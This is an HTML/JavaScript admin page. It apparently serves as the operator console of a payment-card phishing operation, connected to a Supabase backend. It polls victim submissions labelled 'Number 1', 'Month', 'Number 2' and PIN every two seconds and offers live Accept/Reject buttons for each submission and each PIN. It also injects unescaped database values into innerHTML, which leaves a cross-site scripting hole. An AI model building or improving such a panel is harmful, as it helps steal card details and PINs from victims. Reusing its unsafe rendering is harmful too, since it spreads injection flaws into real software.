<!DOCTYPE html>
<html>
<head>

<title>Admin Panel</title>

<script src="https://unpkg.com/@supabase/supabase-js@2"></script>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:#0f0f0f;
    color:white;
    font-family:Arial;
    padding:30px;
}

h1{
    margin-bottom:30px;
    text-align:center;
    font-size:40px;
}

.card{
    background:#1b1b1b;
    padding:25px;
    margin-bottom:20px;
    border-radius:20px;
    border:1px solid rgba(255,255,255,0.08);
}

.card h3{
    margin-bottom:15px;
    color:#ff0080;
}

.card p{
    margin-bottom:10px;
    color:#ddd;
}

button{
    padding:12px 18px;
    border:none;
    border-radius:12px;
    margin-right:10px;
    margin-top:10px;
    cursor:pointer;
    font-weight:bold;
    transition:0.3s;
}

button:hover{
    transform:scale(1.05);
}

.accept{
    background:#00c853;
    color:white;
}

.reject{
    background:#ff1744;
    color:white;
}

.pin{
    color:#ffd54f;
    font-weight:bold;
}

.status{
    color:#00e5ff;
    font-weight:bold;
}

</style>

</head>
<body>

<h1>Admin Panel</h1>

<div id="data"></div>

<script>

const SUPABASE_URL =
'https://ijvtokyhuqrwndyfxzrn.supabase.co';

const SUPABASE_KEY =
'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';

const client = window.supabase.createClient(
    SUPABASE_URL,
    SUPABASE_KEY
);


// LOAD DATA
async function loadData(){

    const { data, error } = await client
    .from('requests')
    .select('*')
    .order('id',{ascending:false});

    if(error){

        document.getElementById('data').innerHTML =
        '<h2>Error Loading Data</h2>';

        console.log(error);

        return;
    }

    let html = '';

    data.forEach(row=>{

        html += `

        <div class="card">

        <h3>Request ID: ${row.id}</h3>

        <p>
        <b>Number 1:</b>
        ${row.number1}
        </p>

        <p>
        <b>Month:</b>
        ${row.date_value}
        </p>

        <p>
        <b>Number 2:</b>
        ${row.number2}
        </p>

        <p class="status">
        STATUS:
        ${row.status}
        </p>

        `;

        // ACCEPT / REJECT
        if(row.status === 'pending'){

            html += `

            <button class="accept"
            onclick="acceptReq(${row.id})">

            Accept

            </button>

            <button class="reject"
            onclick="rejectReq(${row.id})">

            Reject

            </button>

            `;

        }

        // PIN SHOW
        if(row.pin){

            html += `

            <hr style="margin:20px 0; border-color:#333;">

            <p class="pin">
            PIN:
            ${row.pin}
            </p>

            <p>
            <b>PIN STATUS:</b>
            ${row.pin_status}
            </p>

            `;

        }

        // PIN APPROVAL
        if(row.pin_status === 'pending'){

            html += `

            <button class="accept"
            onclick="acceptPin(${row.id})">

            Accept PIN

            </button>

            <button class="reject"
            onclick="rejectPin(${row.id})">

            Reject PIN

            </button>

            `;

        }

        html += `</div>`;

    });

    document.getElementById('data').innerHTML = html;

}


// AUTO REFRESH
setInterval(loadData,2000);

loadData();


// ACCEPT REQUEST
async function acceptReq(id){

    await client
    .from('requests')
    .update({
        status:'accepted'
    })
    .eq('id',id);

}


// REJECT REQUEST
async function rejectReq(id){

    await client
    .from('requests')
    .update({
        status:'rejected'
    })
    .eq('id',id);

}


// ACCEPT PIN
async function acceptPin(id){

    await client
    .from('requests')
    .update({
        pin_status:'accepted'
    })
    .eq('id',id);

}


// REJECT PIN
async function rejectPin(id){

    await client
    .from('requests')
    .update({
        pin_status:'rejected'
    })
    .eq('id',id);

}

</script>

</body>
</html>
